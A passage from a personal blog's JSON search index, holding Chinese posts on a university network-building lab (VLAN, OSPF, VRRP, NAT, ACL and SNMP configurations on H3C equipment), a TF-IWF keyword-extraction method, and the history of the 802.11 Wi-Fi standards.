Wikipedia)","categories":[{"name":"计算机视觉","slug":"计算机视觉","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/tags/CV/"},{"name":"滤波","slug":"滤波","permalink":"http://enderxiao.github.io/tags/%E6%BB%A4%E6%B3%A2/"},{"name":"平滑","slug":"平滑","permalink":"http://enderxiao.github.io/tags/%E5%B9%B3%E6%BB%91/"},{"name":"双边滤波","slug":"双边滤波","permalink":"http://enderxiao.github.io/tags/%E5%8F%8C%E8%BE%B9%E6%BB%A4%E6%B3%A2/"}]},{"title":"计算机网络综合组网实验","slug":"计算机网络综合组网实验","date":"2021-12-23T12:37:24.000Z","updated":"2024-07-30T11:26:33.938Z","comments":true,"path":"2021/12/23/计算机网络综合组网实验/","permalink":"http://enderxiao.github.io/2021/12/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%BB%BC%E5%90%88%E7%BB%84%E7%BD%91%E5%AE%9E%E9%AA%8C/","excerpt":"北航计算机网络实验——综合组网实验，实验流程","text":"北航计算机网络实验——综合组网实验，实验流程 总体介绍 综合组网的总体规划与设计 网络路由设计 NAT地址转换与访问控制的设计 网络管理和网络应用的部署 应用背景 场景设置：北航沙河校区信息平台2号楼机房 网络规模：6层，30个机房，1600多台计算机 实验目的 了解网络设计的原则与过程 了解网络总体架构设计 了解拓扑结构和地址划分 了解网络安全性、可靠性、路由、可管理性 了解网络应用的部署和相关网络应用软件的使用 网络组建过程 需求分析 总体规划 系统设计 系统结构设计 拓扑结构设计 技术选择 设备选型 工作站、服务器、路由器、交换机/集线器、共享设备、网络适配器、加密设备、UPS电源 系统集成 逻辑结构图设计 项目及分包商管理 硬件软件采购 开发环境建立 软件开发 应用系统安装、测试、实施、培训 综合布线 总体规划 需求分析 能够访问互联网 满足多媒体、流媒体教学 网络连通性可控，禁用一个机房，其余机房不受影响 支持组播应用 支持抗ARP病毒攻击，广播风暴抑制、DHCP协议、IPv6协议 网络设备要能够被实时监控和管理 体系结构设计 采用TCP/IP体系结构，满足与其他网络系统的互联互通 分层划分网络 不同层次使用不同级别的千兆交换机，出口路由器采用中高端路由器 采用NAT技术规划网络，IP地址划分采用每个机房一个网段，NAT采用基于端口的NAT-PT技术，申请少于128个公网地址的地址池 采用ACL控制机房的访问 采用支持IPv6协议、DHCP协议、路由协议、组播协议及安全性高的设备 拓扑结构设计 网络分层设计模式 核心层：高速数据交换 汇聚层：路由汇聚及流量收敛 接入层：接入和本地流量控制 网络可靠性设计 链路备份技术 WAN链路备份：用于为路由器的广域网接口提供背备份（也可用于局域网接口备份） 主接口：路由器上的任意一个物理接口和子接口，以及逻辑通道（Dialer口除外） 备份接口：当主接口故障时，多个备份接口可以根据配置的优先级来决定接替顺序；且备份接口具有分担负载功能。 配置命令： [Quidway] interface type number [Quidway interface xxx] standby interface type number [priority] LAN链路备份 使用二层交换机支持的STP协议、端口聚合技术等实现——实验2 数据链路层实验，用以解决广播风暴的问题 核心交换机S1和汇聚交换机S2之间采用链路备份技术，配置STP或端口聚合 配置命令： [Quidview] stp enable [quidview]link-aggregation Ethernet port_numl1 to Ethernet port_num2 {ingress|both} 实验步骤： 使用dis mac命令可以查看当前路由器的MAC地址表 使用undo命令可以清空MAC地址表，注意交换机自身每个端口也有MAC地址，交换机是通过原地址进行学习 当两台交换机链接形成环路时，会产生严重的广播风暴 使用 stp enable命令，开启生成树协议，使用该协议可以有效抑制广播风暴，此外当该协议启动后，断掉其中一条链接，仍然可以用另一条进行通信 使用inter e0/1 进入该端口 进入后使用dup full命令使该端口变为全双工的工作模式 使用speed 100，把速度设为100兆 之后对e0/2口做相同的操作 使用命令 link-aggregation e0/1 to e0/2对两个端口进行端口聚合，注意两台交换机都需要进行相同的配置 注意，在网上实验时，使用端口聚合将导致局域网内计算机互相ping不通，属于正常线性，实际使用时是可以联通的，此时端口其中一条链接就能使局域网内个计算机能通信 路由备份 路由协议备份 核心交换机和核心路由器之间采用路由备份，配置下一跳是备份组、R1和R2三条默认路由 主要体现在访问Internet的默认路由上，即在核心交换机上配置下一跳地址分别为虚拟路由器地址：192.168.100.2/24、核心路由器r1和r2接口地址的三条默认路由，并设置不同的优先级 设备本分技术 VRRP，虚拟路由器冗余协议，一种LAN接入设备备份协议 将局域网的一组多台路由器组成一个虚拟路由器，称为备份组，优先级最高者为主用路由器，其余为备用。(对路由器进行设备备份后，就实现了路由备份) 核心层采用核心路由器双机热备份，R1为主路由器、R2为备份路由器，备份组的虚拟路由地址为192.168.100.2/24 配置命令： vrrp vrid virtual_router_id virtual-ip virtual-ip-address vrrp vrid virtual_router_id priority priority vrrp vrid virtual_router_id timer-advertise seconds IP地址规划与子网划分 IP地址分配 每小组分配的公网地址网段是192.168.5.*/24，其中*为组号* 5 到 组号* 5 + 4 VLAN划分 只需为汇聚交换机S2，核心交换机S1划分Vlan 汇聚交换机S2上，为每个实验室建立一个Vlan，编号为实验室房间号，然后将所有链接该实验室的接入交换机的端口都划分到这个Vlan里。 在核心交换机S1上，为每个楼层建立一个Vlan，编号分别为Vlan30-Vlan80 为了交换机间能传送不同Vlan的数据帧，相应的交换机端口需要设置Trunk端口，并允许所有Vlan数据帧通过 Vlan划分 帧格式由802.1Q标准描述， Tagged和Untagged是端口的一个属性 Untagged Access端口都是Untagged Trunk端口只有缺省Vlan才是Untagged Hybrid端口可以设置针对某些Vlan是Untagged Tagged Trunk端口缺省Vlan外所有Vlan都是Tagged Hybrid端口可以设置针对某些Vlan是Tagged 缺省Vlan ID(pvid) 指每个端口都有一个Vlan属性，值为pvid，可以个人设置 当交换机从某个端口收到一个不带Vlan标签的数据帧时，在交换机内部将该数据帧视为带pvid标签的数据帧 H3C交换机初始缺省Vlan为Vlan1（pvid=1） 步骤： 清空重启交互机: reset saved-configuration reboot 使用组网软件配置Trunk信息 system 进入系统视图 sy S1 修改设备名称为S1 vlan2 创建Vlan2 port e 0/1 to e 0/5 设置0/1到0/5端口为Vlan2 vlan3 创建vlan3 port e 0/20 to e 0/24 指定0/20到0/24端口为Vlan3 int e 0/13 进入E 0/13 端口（即两台交换机互联的端口） port link-type trunk 配置trunk类型 port trunk permit vlan 2 3 让trunk允许Vlan2和3通过 inter vlan 2 进入Vlan2配置 ip add 192.168.2.1 255.255.255.0 配置Vlan2的接口IP地址（即该网段下的默认网关） inter vlan 3 进入Vlan3配置 ip add 192.168.3.1 255.255.255.0 配置Vlan2的接口IP地址（即该网段下的默认网关） 清空所有计算机的ARP缓存，以及交换机的MAC地址表和ARP缓存 Vlan 间路由 清空交换机MAC地址表命令：undo mac-address 清空交换机ARP缓存命令：undo arp+IP地址 清空计算机ARP缓存命令：arp -b 路由设计 为各小组配置RIP或OSPF动态路由协议。并配置适当的静态路由或默认路由，确保全网互通，并能访问Internet PPP协议配置过程： sys sysname R1 inter s0/0进入端口 ip address ip_address 配置IP地址 link-protocol ppp 配置链路协议为ppp 使用路由器调试协议调试ppp quit 退出系统视图，进入用户视图 debugging ppp lcp all 调试ppp 链路控制协议lcp terminal debugg 就能看到报文 undo terminal debugg 关闭调试功能 PAP认证配置过程： R1： sys inter s0/0 local-user RTB 设置用户名 service-type ppp password simple aaa 设置密钥 inter s0/0 ppp authentication-mode pap 授权R1为认证方 R2: ppp pap local-user RTB password simple aaa 使用该用户登录 shutdown undo shutdown 重启端口 ARP实验： 命令行中输入ARP -a可查看ARP缓存 使用ARP -b可以清除ARP缓存 静态路由配置： ip route-static IP-address mask nexthop-address 默认路由配置： ip route-static 0.0.0.0 0.0.0.0 nexthop-address RIP协议配置 rip协议调试命令： debugging rip packet terminal debugging rip配置命令： [R1] rip 启动路由器RIP [R1-rip] network 192.168.1.0 指定启动RIP协议的网段地址，指定在哪个接口地址启动RIP协议 [S1] rip [S1-rip] network 192.168.1.0 [S1-rip] network 192.168.2.0 rip 2 配置命令： [r1-Ethernet0] rip version 2 [r1-Ethernet0] rip authentication-mode md5 simple buaa 查看路由表的命令： [S1]display IP routing-table OSPF协议配置 配置Router ID system-view 进入系统视图 router id router-id 配置路由器ID undo router id 取消路由器ID号 启动OSPF ospf [process-id [ [ router-id router-id ] vpn-instance vpn-instance-name ] ] 启动OSPF，进入OSPF视图 undo ospf [ process-id ] 关闭OSPF路由协议进程 进入OSPF区域视图 area area-id 在OSPF视图下，进入OSPF区域视图 undo area area-id 删除指定的OSPF区域 指定网段使能OSPF network ip-address wildcard-mask 指定网段运行OSPF协议 undo network ip-address wildcard-mask 取消网段运行OSPF协议 具体参见实验指导书电子版193页 地址转换（NAT）与访问控制（ACL） 每个小组分配的公有地址网段为192.168.5.*/24，其中*为组号* 5 到 组号* 5 + 4 R1地址池为：组号 * 5 - 组号 * 5 +2 R2地址池为：组好 * 5 + 3 - 组号 * 5 + 4 修改R1和R2上的ACL，使得第二个房间考试，禁用Internet，第一个房间正常上网 网络管理应用部署 对核心路由器R1、R2，核心交换机S1，汇聚交换机S2，进行，在被管理设备上配置SNMP网络协议，4台PC机作为管理服务器 进行拓扑自动发现，并浏览核心交换机S1设备信息 将核心路由器R1，R2的E1接口断开，截获并分析Trap报文，写出报文的字段名和字段值，然后重新链接，通过网管服务器查看路由器状态 组播应用部署 在核心交换机S1和汇聚交换机S1上配置组播路由协议PIM DM 启动组播测试软件，PCA作为组播源，BCD测试是否能收到信息 网络测试 设计配置完网络设备和PC后，设计方案对网络连通性、地址转换、访问控制、组播应用等进行测试 最终配置 组网图 IP配置： PCA： IP地址：10.3.3.2 默认网关：10.3.3.1 PCB： IP地址：10.3.4.2 默认网关：10.3.4.1 R1: 0/0端口IP：192.168.100.3 0/1端口IP: 192.168.5.155 R2: 0/0端口IP：192.168.100.4 0/1端口IP: 192.168.5.157 S2 核心交换机配置 Vlan 划分与配置 12345678910111213141516171819202122232425262728293031[S2] vlan 3[S2-vlan3] port e 1/0/1[S2-vlan3] ip address 192.168.3.2 24[S2-vlan3] int e 1/0/1[S2-Ethernet1/0/1] port link-type trunk[S2-Ethernet1/0/1] quit[S2] vlan 303[S2-vlan303] port e 1/0/23[S2-vlan303] ip address 10.3.3.1 24[S2-vlan303] quit[S2] vlan 304[S2-vlan304] ip address 10.3.4.1 24[S2-vlan304] quit[S2] int e1/0/1[S2-Ethernet1/0/1] port trunk permit vlan 303 304 3[S2-Ethernet1/0/1] quit Ospf配置 1234567891011121314151617[S2] ospf[S2-ospf-1] area 0[S2-ospf-1-area-0.0.0.0] network 192.168.100.0 0.0.0.255[S2-ospf-1-area-0.0.0.0] network 192.168.3.0 0.0.0.255[S2-ospf-1-area-0.0.0.0] network 10.3.3.0 0.0.0.255[S2-ospf-1-area-0.0.0.0] network 10.3.4.0 0.0.0.255[S2-ospf-1-area-0.0.0.0] quit[S2-ospf-1] default-route-advertise[S2-ospf-1] quit Stp协议配置与链路聚合配置 12345678910111213141516171819[S2] stp enable[S2] Interface bridge-aggregation 1[S2-Bridge-Aggregation1] Link-aggregation mode dynamic[S2-Bridge-Aggregation1] Int e 1/0/1[S2-Ethernet1/0/1] Port link-aggregation group 1[S2-Bridge-Aggregation1] Int e 1/0/3[S2-Ethernet1/0/3] Port link-aggregation group 1[S2-Ethernet1/0/3] Int bridge-aggregation 1[S2-Bridge-Aggregation1] Port link-type trunk[S2-Bridge-Aggregation1] Port trunk permit vlan all 配置PIM-DM协议 1234567891011[S2] multicast routing-enable[S2] int vlan 303[S2-vlan-interface303] pim dm[S2-vlan-interface303] quit[S2] int vlan 304[S2-vlan-interface304] pim dm S1汇聚层交换机配置： Vlan 划分与配置 1234567891011121314151617181920212223[S1] vlan 100[S1-vlan100] port Ethernet 1/0/23 to Ethernet 1/0/24[S1-vlan100] quit[S1] interface vlan 100[S1-vlan-interface100] ip address 192.168.100.1 24[S1-vlan-interface100] quit[S1] vlan 3[S1-vlan3] int vlan 3[S1-vlan-interface3] ip address 192.168.3.1 24[S1-vlan-interface3] int e 1/0/1[S1-Ethernet1/0/1] port link-type trunk[S1-Ethernet1/0/1] port trunk permit vlan 3 100 Ospf配置 12345678910111213141516171. 1. [S1] ospf[S1-ospf-1] area 0[S1-ospf-1-area-0.0.0.0] network 192.168.100.0 0.0.0.255[S1-ospf-1-area-0.0.0.0] network 192.168.3.0 0.0.0.255[S1-ospf-1-area-0.0.0.0] network 10.3.3.0 0.0.0.255[S1-ospf-1-area-0.0.0.0] network 10.3.4.0 0.0.0.255[S1-ospf-1-area-0.0.0.0] quit[S1-ospf-1] default-route-advertise[S1-ospf-1] quit Stp协议配置与链路聚合配置 12345678910111213141516171819[S1] stp enable[S1] Interface bridge-aggregation 1[S1-Bridge-Aggregation1] Link-aggregation mode dynamic[S1-Bridge-Aggregation1] Int e 1/0/1[S1-Ethernet1/0/1] Port link-aggregation group 1[S1-Bridge-Aggregation1] Int e 1/0/3[S1-Ethernet1/0/3] Port link-aggregation group 1[S1-Ethernet1/0/3] Int bridge-aggregation 1[S1-Bridge-Aggregation1] Port link-type trunk[S1-Bridge-Aggregation1] Port trunk permit vlan all 配置PIM-DM协议 12345[S1] multicast routing-enable[S1] int vlan3[S1-vlan-interface3] pim dm R1 核心路由器配置 端口IP配置： 123456789[R1] int e0/1[R1-Ethernet0/1] ip address 192.168.5.155 24[R1-Ethernet0/1] quit[R1] int e0/0[R1-Ethernet0/0] ip address 192.168.100.3 24 Acl配置 12345678910111213141516171819202122232425[R1] nat address-group 1[R1-nat-address-group-1] address 192.168.5.155 192.168.5.156[R1-nat-address-group-1] quit[R1] acl number 2001[R1-acl-basic-2001] rule permit source 192.168.3.0 0.0.0.255[R1-acl-basic-2001] rule permit source 192.168.100.0 0.0.0.255[R1-acl-basic-2001] rule permit source 10.3.3.0 0.0.0.255[R1-acl-basic-2001] rule permit source 10.3.4.0 0.0.0.255[R1-acl-basic-2001] rule deny source any[R1-acl-basic-2001] quit[R1] int e0/1[R1-Ethernet0/1] nat outbound 2001 address-group 1[R1-Ethernet0/1] quit VRRP配置 1[R1] vrrp vrid 11 virtual-ip 192.168.100.2 Ospf 配置 123456789101112131415[R1] ospf[R1-ospf-1] area 0[R1-ospf-1-area-0.0.0.0] network 192.168.100.0 0.0.0.255[R1-ospf-1-area-0.0.0.0] network 192.168.3.0 0.0.0.255[R1-ospf-1-area-0.0.0.0] network 10.3.3.0 0.0.0.255[R1-ospf-1-area-0.0.0.0] network 10.3.4.0 0.0.0.255[R1-ospf-1-area-0.0.0.0] quit[R1-ospf-1] default-route-advertise cost 100 Snmp配置 1234567[R1] snmp com write private[R1] snmp com read public[R1] snmp trap enable[R1] snmp target-host trap address udp-domain 10.3.3.2 params securityname public R2 核心路由器配置 端口IP配置： 123456789[R2] int e0/1[R2-Ethernet0/1] ip address 192.168.5.157 24[R2-Ethernet0/1] quit[R2] int e0/0[R2-Ethernet0/0] ip address 192.168.100.4 24 Acl配置 12345678910111213141516171819202122232425[R2] nat address-group 1[R2-nat-address-group-1] address 192.168.5.157 192.168.5.159[R2-nat-address-group-1] quit[R2] acl number 2001[R2-acl-basic-2001] rule permit source 192.168.3.0 0.0.0.255[R2-acl-basic-2001] rule permit source 192.168.100.0 0.0.0.255[R2-acl-basic-2001] rule permit source 10.3.3.0 0.0.0.255[R2-acl-basic-2001] rule permit source 10.3.4.0 0.0.0.255[R2-acl-basic-2001] rule deny source any[R2-acl-basic-2001] quit[R2] int e0/1[R2-Ethernet0/1] nat outbound 2001 address-group 1[R2-Ethernet0/1] quit VRRP配置 123[R2] vrrp vrid 11 virtual-ip 192.168.100.2[R2] vrrp vrid 11 priority 80 Ospf 配置 123456789101112131415[R2] ospf[R2-ospf-1] area 0[R2-ospf-1-area-0.0.0.0] network 192.168.100.0 0.0.0.255[R2-ospf-1-area-0.0.0.0] network 192.168.3.0 0.0.0.255[R2-ospf-1-area-0.0.0.0] network 10.3.3.0 0.0.0.255[R2-ospf-1-area-0.0.0.0] network 10.3.4.0 0.0.0.255[R2-ospf-1-area-0.0.0.0] quit[R2-ospf-1] default-route-advertise cost 200","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"高级计算机网络","slug":"研究生/高级计算机网络","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E9%AB%98%E7%BA%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"高级计算机网络","slug":"高级计算机网络","permalink":"http://enderxiao.github.io/tags/%E9%AB%98%E7%BA%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"北航计网实验","slug":"北航计网实验","permalink":"http://enderxiao.github.io/tags/%E5%8C%97%E8%88%AA%E8%AE%A1%E7%BD%91%E5%AE%9E%E9%AA%8C/"},{"name":"综合组网实验","slug":"综合组网实验","permalink":"http://enderxiao.github.io/tags/%E7%BB%BC%E5%90%88%E7%BB%84%E7%BD%91%E5%AE%9E%E9%AA%8C/"}]},{"title":"改进TF-IDF关键词提取方法","slug":"改进TF-IDF关键词提取方法","date":"2021-11-14T04:16:36.000Z","updated":"2024-07-30T11:26:33.932Z","comments":true,"path":"2021/11/14/改进TF-IDF关键词提取方法/","permalink":"http://enderxiao.github.io/2021/11/14/%E6%94%B9%E8%BF%9BTF-IDF%E5%85%B3%E9%94%AE%E8%AF%8D%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95/","excerpt":"使用TF-IWF关键词提取技术改进TF-IDF","text":"使用TF-IWF关键词提取技术改进TF-IDF 动机 但 IDF 的简单结构并不能有效地反映单词的重要程度和特征词的分布情况，使其无法很好地完成对权值调整的功能，所以TF-IDF 算法的精度并不是很高，尤其是当文本集已经分类的情况下 TF-IDF TF−IDFi,j→TFi,j×IDFi=ni,j∑knk,j×log∣D∣∣j:ti∈dj∣TF-IDF_{i,j} \\\\ \\to TF_{i,j}\\times IDF_{i} \\\\ = \\frac{n_{i,j}}{\\sum_{k}n_{k,j}} \\times log\\frac{|D|}{|{j:t_i \\in d_j}|} TF−IDFi,j​→TFi,j​×IDFi​=∑k​nk,j​ni,j​​×log∣j:ti​∈dj​∣∣D∣​ TF nijn_{ij}nij​ 表示词语tijt_{ij}tij​在文本j中的频数 分母表示文本中所有词语的频数之和 IDF |D|表示语料库d的文档数 ∣j:ti∈dj∣|{j:t_i \\in d_j}|∣j:ti​∈dj​∣表示本语料库d中包含文档j中词语tit_iti​的文档数 缺陷 IDF的简单结构并不能使提取的关键词，十分有效地反应单词的重要程度和特征词的分布情况，使其无法很好地完成对权值调整的功能。尤其是在同类语料库中，一些同类文本的关键词将被掩盖。 例如：语料库D中教育类文章篇多，而文本j是一篇属于教育类的文章，那么教育类相关的词语的IDF值会偏小，使提取文本关键词的召回率更低 TF-IWF TF−IWFi,j→TFi,j×IWFi=ni,j∑knk,j×log∑i=1mntintiTF-IWF_{i,j} \\\\ \\to TF_{i,j} \\times IWF_{i}\\\\ = \\frac{n_{i,j}}{\\sum_k n_{k,j}} \\times log\\frac{\\sum_{i=1}^m nt_{i}}{nt_{i}} TF−IWFi,j​→TFi,j​×IWFi​=∑k​nk,j​ni,j​​×lognti​∑i=1m​nti​​ TF nijn_{ij}nij​表示词语tit_iti​在文本j中的频数 分母表示文本j中所有词语频数和 IWF 分子表示语料库中所有词语的频数之和 分母表示词语tit_iti​在语料库中的总频数 这种加权方法降低了语料库中同类型文本对词语权重的影响，更加精确地表达了这个词语在待查文档中的重要程度","categories":[],"tags":[]},{"title":"高级计算机网络报告","slug":"高级计算机网络报告","date":"2021-10-27T07:51:29.000Z","updated":"2024-07-30T11:26:33.940Z","comments":true,"path":"2021/10/27/高级计算机网络报告/","permalink":"http://enderxiao.github.io/2021/10/27/%E9%AB%98%E7%BA%A7%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%8A%A5%E5%91%8A/","excerpt":"","text":"802.11发展史 研究背景 2019年9月16日，Wi-Fi联盟宣布启动Wi-Fi 6认证计划，该计划旨在使采用下一代802.11ax Wi-Fi无线通信技术的设备达到既定标准。近年来，获得Wi-Fi 6认证的路由器产品正逐渐增多，支持Wi-Fi6的手机也越来越多，这不免让我们产生了这样的疑问：Wi-Fi 6到底为我们的日常生活带来了怎样的遍历？相较于老版本的认证标准，Wi-Fi 6从哪些方面进行了优化？这些问题促使我对Wi-Fi使用的协议802.11的发展历史进行了相关的研究，本文通过梳理802.11的发展历程，对比各个版本之间的差异，来展现该协议对我们日常生活的影响，以及对将要到来的Wi-Fi 7无线网络进行预先的了解 802.11 802.11协议即IEEE 802.11 - 1997 是最初通过的802.11版本，该协议中物理层机制已经不再使用，包括FHSS模式和IR的淘汰，以及DSSS模式已经在802.11b中进行了拓展。802.11协议只对物理层和数据链路层进行了定义，数据链路层有分为逻辑链路控制（LLC）子层和介质访问控制（MAC）子层。 LLC层主要定义了MAC层的接入规则，在这一版的协议中定义了DCF和PCF两种接入模式。基于IEEE 802.2 MAC层 如下是802.11中定义的MAC层的帧格式： 其中Octets指包含8bit的字节。 Frame Control字段 Frame Control用于区分关联帧，RTS帧，CTS帧，ACK帧，数据帧到AP和总AP字段用于定义不同地址字段的含义。其中细节如下： Protocol表明协议版本 Type用以区分帧的类型，802.11中定义了三种类型的帧，管理帧值为00负责监督，主要用来加入或退出无线网络，以及处理基站之间链接的转移事宜；控制帧值为01通常与数据帧搭配使用，负责区域的清空、信道的取得以及载波监听的维护；数据帧值为10负责在工作站之间传输数据、帧类型11保留尚未使用。 Subtype时发送帧的子类型，例如请求发送帧RTS的type为01，Subtype为1011。CTS的type为01，Subtype为1100 To DS与From DS分别表示无线链路向无线站点或AP发送的帧和无线站点向无线链路发送的帧。 More Fragments用于说明长帧被分段的情况，是否还有其它的帧。若较上层的封包经过MAC 分段处理，最后一个片段除外，其他片段均会将此bit 设定为1。 Retry有时候可能需要重传帧。任何重传的帧会将此bit 设定为1，以协助接收端剔除重复的帧。 Power Management此bit 用来指示、完成当前的帧交换过程后，发送端的电源管理状态。为1表示STA处于Power_save模式，为0表示STA处于active模式。 More Data只用于管理数据帧，在控制帧中此bit必然为0。 WEP用以表示Frame Body中是否包含由WEP加密的数据。 其他字段 Duration/ID在数据帧和RTS、CTS帧中均存在，指明传输其数据帧的时间和传输确认的时间。 Sequence Control使用序号使接收方区分新传输的帧和以前帧的重传，类似于传输层的序号字段。 Frame Body则为有效载荷，由一个IP数据报或者ARP分组组成，最大长度为2312字节，但通常小于1500字节 FCS则是一个32位的CRC效验码 地址字段 802.11中定义的地址包含如下四种： DA-Destination Address SA-Source Address RA-Receiver Address TA-Transmitter Address Address字段的含义根据帧类型的不同而不同，具体如下表所示： 功能 To Ds字段 From Ds字段 Address1 Address2 Address3 Address4 IBSS 0 0 DA/RA SA/TA BSSID N/A TP AP（基础结构） 1 0 BSSID/RA SA/TA DA N/A From AP（基础结构） 0 1 DA/RA BSSID/TA SA N/A WDS（桥接器） 1 1 BSSID/RA BSSID/TA DA SA IBSS表示该数据帧从STA发往AP上行以太网；To AP表示该数据帧从STA发往AP；From AP表示该数据帧从AP发出，发往STA；WDS表示该数据帧用于无线网桥间发送数据。 物理层 物理层分为两个子层，分别是物理层收敛程序（PLCP）层和物理介质相关（PMD）层。PMD主要规定了调制技术和编码技术负责将PLCP传来的每个位单元利用天线传送至空中，而PLCP会为来自上层的数据帧加上自己的标头，负责无干扰信道评估（CCA）模式该技术在检测到周边有无线信号干扰时，可自动调整频宽模式，避开信道干扰，使无线信号更加稳定。当干扰消失时，又可自动捆绑空闲信道，充分利用信道捆绑优势，提升无线性能。，为不同的物理层技术构建分组。 802.11 -1997在物理层上最初定义了三种制式，分别是跳频技术（FHSS），DSSS和IR，FHSS和DSSS均工作在2.4G频段，IR则是采用标准的红外线。 FFHS和DSSS均属于扩频（Spread Spectrum）技术，其基本思想就是让信号所占有的频带宽度远大于所传信息必须的最小带宽。而DSSS就是直接在发送端用高码率的扩散码序列去扩散信号频谱信号的频谱，直观上来看就是载波信号的发射频率充满了整个带宽（频谱）。如果我们将信号传输比喻为在公路上行驶的货车，那么扩频技术就是为这辆火车提供了更多车道的公路，由单车道升级为了4车道甚至8车道，而如何利用这些车道则衍生出了FFHS和DSSS两种策略。而DSSS是将货物分包，让多辆货车在不同的车道上运输货物，在接收端重新组装这些货物。 而FHSS技术则是由载波快速在不同频率中切换实现。依然拿货车举例，现在我们的策略是，让这辆货车以一定规律（或者以伪随机）在不同的车道间进行切换，只要接收端和发送端同步切换，最终就能成功接收这批货物。值得一提的是不停更换无线电频率一躲避干扰及侦探的思路是二战时期由一位好莱坞女明星海蒂拉玛提供的，而如何使发送端和接收端同步的问题则是由前卫音乐家乔治·安塞尔根据自动演奏钢琴的原理提出的解决方案。 以上两个传输速率大概能达到1Mbps-2Mbps，FHSS会占用更大的频带宽度，需要79MHz，但每一个跳频只需要占用1MHz即可，子带宽更小意味着更低的采样率，即硬件成本将得到节约。DSSS的每个子频带则需要22MHz的带宽。此时的FHSS使用的调制方式为FSK，DSS使用的调制方式为PSK FHSS对应的PLCP帧格式如下： 其中PLCP preamble中包含的Sync用于做时频同步，Start Frame Delimiter（SFD）用于表示帧的开头，由一个交替的01串构成，以0开头，以1结尾。SFD由16位二进制模式0000 1100 1011 1101（首先传输最左边的位）组成。第一个bit与Sync的最后一个比特相同。PLCP Header中包含的12bit长的PLW即PSDU Length Word代表从上层传来的MAC帧总长度，PSF即PLCP Signaling field用以表示传输速率，实际上最初的802.11已经存在了不同的速率，Header Error Check则是校验位，采用CRC-16对头部进行校验。 DSSS对应的PLCP帧格式如下： 可见其帧构造和FHSS类似，这一结构一直沿用到了802.11b，其中Signal表示的是数据帧的调制方式，并且数据率等于Signal值乘以100kbit/s。而Service字段被保留，供将来使用。 而对于红外而言，由于红外光的缺点在于容易受可见光的干扰，所以一般红外光的通信范围在1m左右，且穿墙能力较弱。灵活性和可移动性不如无线电波，而灵活性与移动性是一般采用802.11的最大驱动力。因此很快被从802.11中删除，在此不做讨论。 802.11a/802.11b 802.11a/b是802.11协议的第二个阶段的版本，都是在1999年发布的，用现在Wi-Fi的新的命名方式来说的话，802.11b对应的是Wi-Fi 1，802.11a对应的是Wi-Fi 2。 802.11b 802.11b通常被认为是Wi-Fi1，由之前对802.11的分析可知，在速度和传输距离上，802.11显然不能满足人们的需要，因此802.11b主要引入了CCK编码方式，使得经过CCK调制后的数据速率提升到了5.5Mbps和11Mbps，CCK为了对抗多径干扰，需要更复杂的均衡及调制，实现起来相对困难，这也推动了IEEE802.11引入新的调制技术。此外，协议还定义了一种可选的调制模式，PBCC。 另外，为了配合调制技术上的改动，PLCP帧的部分，802.11b引入了Short Preamble的结构，支持56bit的Sync字段。 并且802.11 -1997中被保留的Service字段中的3个bit也被用上了其中一位用来表示调制模式是CCK还是PBCC。由于支持了11Mbps后，原有的length字段的时间精度不够了，于是service中的一位就用来补位以提升精度 802.11a 802.11a通常被认为是Wi-Fi2，802.11a则是采用的OFDM模式进行调制，将信道分成许多相互正交的子信道，每个信道包含多个子载波，每个载波上可以进行独立的调制，比如QPSK、QAM，在各个子信道中的这种正交调制和解调可以采用反向快速傅里叶变换（IFFT）和快速傅里叶变换（FFT）方法来实现，随着技术的发展，IFFT和FFT都是非常容易实现的。FFT的引入，大大降低了OFDM实现的复杂性，提升了系统的性能。OFDM可以很好的抵抗干扰以及减少多径效应（指电磁波经不同路径传播后，各分量场到达接收端时间不同，按各自相位相互叠加而造成干扰，使得原来的信号失真，或者产生错误。）的影响。并且，由于2.4GHz频带802.11a采用5GHz的频带，让802.11具有更少冲突的优点，然而高载波频率也带来了负面效果，802.11a几乎被限制在直线范围内使用，这导致必须使用更多的接入点，并且高频率也使得其更容易被吸收，无法像802.11b哪有传播的很远。802.11a的速率可以达到54Mbps。 由于制式、频带的不同，802.11a与802.11b的设备无法相互兼容。并且由于802.11a成本较高，相较于802.11b，它更多的被用于商业，而非家庭 802.11g 802.11g通常被认为是Wi-Fi3，802.11g世代中，MAC层部分仍然没有太大的改进，改变主要集中于物理层次技术的发展，在802.11a中得到更高速率的OFDM被加入到了802.11g中，使得数据传输速率提高到20Mbps以上。在802.11g中支持了4种物理层制式，分别是ERP-DSSS/CCK、ERP-OFDM、ERP-DSSS-OFDM、ERP-PBCC 其中ERP指Extended Rate PHY，即拓展物理层速率。 此外802.11g将OFDM引入到2.4G频段也是处于对802.11b设备的兼容考虑，降低了用户的投资，延长了802.11b产品的使用寿命。 802.11g的数据传输速率能达到54Mbps。802.11g设备具有如下有点： 兼容性好，支持设备丰富 相对便宜 缺点： 由于需要兼容802.11b设备，因此为了匹配这些设备而使得网络速度减低 802.11n 802.11n通常被认为是Wi-Fi4，是802.11g的升级，它引入了MIMO技术来提高802.11g的速率，提供了高达600Mbps的带宽，其信号强度也得到了增强，使得其覆盖范围比以往的Wi-Fi协议更好。有了802.11g的基础，802.11n在设计时也考虑了对802.11a/b/g设备的兼容性。 MIMO技术的基本思想是在发送端和接收端都使用多跟天线，在收发之间构成多个信道的天线系统。之前提到的多径效应会影响信号质量，因此传统的天线系统都在如何消除多径效应上动脑筋，而MIMO系统正好相反，它利用多径效应来改善通信质量。在MIMO系统中，收发双方使用多副可以同时工作的天线进行通信。MIMO系统通常采用复杂的信号处理技术来显著增强可靠性、传输范围和吞吐量。发射机采用这些技术同时发送多路射频信号，接收机再从这些信号中将数据恢复出来。 802.11ac 